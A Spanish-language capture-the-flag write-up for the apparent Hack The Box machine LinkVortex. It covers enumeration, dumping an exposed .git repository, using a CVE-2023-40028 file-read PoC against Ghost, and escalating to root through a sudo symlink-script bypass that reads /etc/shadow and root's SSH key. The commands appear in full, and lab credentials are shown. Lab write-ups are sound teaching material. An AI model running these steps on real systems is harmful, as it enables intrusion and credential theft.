# Enumeracion
Empezamos haciendo un escaneo de puertos con [[Anotaciones/Herramientas/Activas/3. Escaneo de puertos/nmap|nmap]] 
```bash
sudo nmap -p- -open -sS -Pn -n --min-rate 5000 -oN allPorts 10.10.11.47

sudo nmap -p22,80 -sVC -Pn -n --min-rate 5000 -oN Targeted 10.10.11.47
```

![[Pasted image 20241223112759.png]]

Analizando la web vemos a simple vista no podemos hacer nada, pero despues de analizar la web con [[whatweb]] vemos que hace uso de `ghost`
```bash
whatweb http://linkvortex.htb/
```
![[Pasted image 20241223113055.png]]

Haciendo una busqueda vemos que esta version de `ghosts` tiene algunas vulnerabilidades, tembien vemos que suele tener un directorio con un panel de login (y asi es):

![[Pasted image 20241223112923.png]]

En este punto y despues de probar multiples ataques vemos que nada da resultado, asi que seguimos enumerando y vemos que el servidor tiene vitual hosting
```bash
gobuster vhost --url http://linkvortex.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 20 --append-domain | grep -v "301"
```
![[Pasted image 20241223113322.png]]

Ahora que tenemos un nuevo recurso vamos a hacer otro analisis de directorios, y resulta que hay un `.git` 
![[Pasted image 20241223113508.png]]

# Explotación

Para trabajar cómodamente vamos a volcar este repositorio en nuestro equipo haciendo uso de [[git_dumper.py]]
```bash
git-dumper http://dev.linkvortex.htb/.git/ ./linkvortex
```


ahora vamos a hacer uso de la herramienta git para analizar el repositior (empezando por los commits), pero no vemos gran cosa, ahora vamos a buscar por algun archivo de authentication y hemos contrado unos cuantos, pero entre ellos hay uno con claves
```bash 
find . -iname '*authentication*'
cat ./ghost/core/test/regression/api/admin/authentication.test.js | grep
```
![[Pasted image 20241223114043.png]]
nos volvemos a la ventana de login y ahora que tenemos unas contraseñas vamos a buscar por usuarios (analizando la web nos damos cuenta que los post estan subidos por un usuario llamado `admin` ) tenemos los siguientes credenciales
`admin@linkvortex.htb:OctopiFociPilfer45`
![[Pasted image 20241223114106.png]]

Una vez dentro, cuando hize la busqueda de exploit vi que el servicio de ghost en esta version tenia un `Arbitrary File read` pero necesitaba de credenciales [Link](https://github.com/0xyassine/CVE-2023-40028), el POC necesita una modificacion en el código
![[Pasted image 20241223114312.png]]
ya podemos hacer uso del POC vamos a probarlo
```bash
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```
![[Pasted image 20241223114509.png]]
despues de estar dandole vueltas descubri que el repositorio que hemos clonado antes tiene un archivo `Dockerfile.ghost` el cual despues de analizalo veo que copia un archivo del equipo a otra localizacion
![[Pasted image 20241223114756.png]]
tenemos credecianles
![[Pasted image 20241223114950.png]]
vamos a ver si son validas para ssh (`bob@linkvortex.htb:fibber-talented-worth`)
```bash
ssh bob@10.10.11.47
```
![[Pasted image 20241223115200.png]]

# Escalada de privilegios
Despues de enumerar posibles vias vemos que podemos ejecutar este comando con permisos de sudo sin necesidad de introducir password
![[Pasted image 20241223125317.png]]
despues de analizar detenidamente el script resulta quelo que hace es comprobar la seguridad de un archivo terminado en `.png` usando el binario `test` en caso de ser muy peligroso lo elimina y en caso de ser sospechoso lo mueve a `quarentena`, el script solo funciona con archivo que son anlaces simbolicos a otros archivos
```bash
echo 'Pero que jiji por tu parte' > jiji
ln -s ~/jiji malicioso.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh malicioso.png
```
![[Pasted image 20241223125612.png]]
y aqui esta movido el archivo
![[Pasted image 20241223125644.png]]
el problema viene cuando un archivo lo elimina directamente que suele sercuando se trata de un archivo que no hemos creadonosotros o esta en ruta sospechochas
![[Pasted image 20241223125938.png]]
una de las forma de hacer bypass es usando un enlace simbolico intermediario por ejemplo supongamos que queremos hacer referencia a `/etc/shadow` , esto daria error ya que usando la palabra  `etc` pero si usamos un enlace simbolico
```bash
ln -s /etc /tmp/safe_directory
ln -s /tmp/safe_directory/shadow bypass.png
```
![[Pasted image 20241223134134.png]]
![[Pasted image 20241223134211.png]]

y ahora ejecutamos el programa
![[Pasted image 20241223134230.png]]
ya tenemos el hash de root, hay otra forma de ser root y es usando su clave rsa usando la misma filosofia
```bash
ln -s /root /tmp/pwn
ln -s /tmp/pwn/.ssh/id_rsa ssh.png
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ssh.png
```

ahora nos pasamos la clave a nuestro equipo y la usamos para conectarnos (los permisos del archivo deben ser 600 o 400)
```bash
chmod 600 root_id_rsa
ssh -i ./root_id_rsa root@10.10.11.47
```
![[Pasted image 20241223141225.png]]
